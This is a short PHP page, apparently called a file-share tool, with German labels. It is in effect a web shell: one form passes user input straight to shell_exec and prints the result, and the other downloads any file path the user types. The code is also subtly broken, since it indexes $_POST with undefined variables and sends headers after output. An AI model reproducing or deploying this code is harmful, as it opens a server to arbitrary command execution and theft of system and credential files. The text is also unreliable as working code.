<form action="fileshare.php" method="post">
Command? <input type="text" name="command">
<input type="submit">
</form>

<form action="fileshare.php" method="post">
Datei? <input type="text" name="data_command">
<input type="submit">
</form>

<?php
$command = $_POST[$command];
$data_command = $_POST[$data_command];


echo "<pre>";
echo shell_exec($command);
echo "</pre>";

?>

<?php
$file = $data_command;

// Check if the file exists
if (file_exists($file)) {
    // Set appropriate headers
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($file));
    header('Content-Length: ' . filesize($file));

    // Read the file and output it to the browser
    readfile($file);
    exit;
} else {
    // File not found
    echo 'File not found.';
}
?>